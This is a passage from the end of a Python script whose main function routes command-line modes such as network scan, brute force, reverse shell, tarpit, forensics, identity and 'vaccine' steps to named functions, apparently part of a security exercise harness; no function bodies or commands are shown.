    if mode == "prep":
        return prep()
    if mode == "net-scan":
        return net_scan(sys.argv[2])
    if mode == "release":
        return release()
    if mode == "net-brute":
        return net_brute(sys.argv[2])
    if mode == "net-revsh":
        return net_revsh(sys.argv[2])
    if mode == "net-revsh-verify":
        return net_revsh_verify(sys.argv[2])
    if mode == "net-tarpit":
        return net_tarpit(sys.argv[2])
    if mode == "sandbox":
        return sandbox_scan()
    if mode == "forensics":
        return forensics_report()
    if mode == "hostile":
        return hostile()
    if mode == "identity":
        return identity()
    if mode == "identity-llm":
        return identity_llm(sys.argv[2])
    if mode == "operator":
        return operator(sys.argv[2], sys.argv[3])
    if mode == "identity-forged":
        return identity_forged()
    if mode == "identity-unlock":
        return identity_unlock()
    if mode == "uid0":
        return uid0()
    if mode == "proposal-apply":
        return proposal_apply()
    if mode == "proposal-revert":
        return proposal_revert()
    if mode == "vaccine-sign":
        return vaccine_sign()
    if mode == "vaccine-apply":
        return vaccine_apply(sys.argv[2], sys.argv[3])
    if mode == "vaccine-intel":
        return vaccine_intel()
    if mode == "forward-up":
        return forward_up()
    if mode == "forward-block":
        return forward_block(sys.argv[2])
    if mode == "levels":
        return levels()
    prep()
    return levels()


if __name__ == "__main__":
    sys.exit(main())
